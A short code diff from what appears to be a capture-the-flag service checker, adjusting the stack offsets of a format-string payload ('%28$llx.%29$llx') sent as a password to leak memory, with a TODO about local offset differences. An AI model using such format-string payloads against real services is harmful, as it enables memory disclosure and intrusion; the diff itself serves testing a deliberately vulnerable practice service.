@@ -208,7 +208,7 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
     await conn.reader.readuntil(b": ")
 
     # Send the format string exploit as the password
-    conn.writer.write(b'%31$llx.%32$llx\n')
+    conn.writer.write(b'%28$llx.%29$llx\n') # TODO: %31$llx.%32$llx locally, find out why?
     await conn.writer.drain()
 
     # Read the buffer to get the incorrect password message
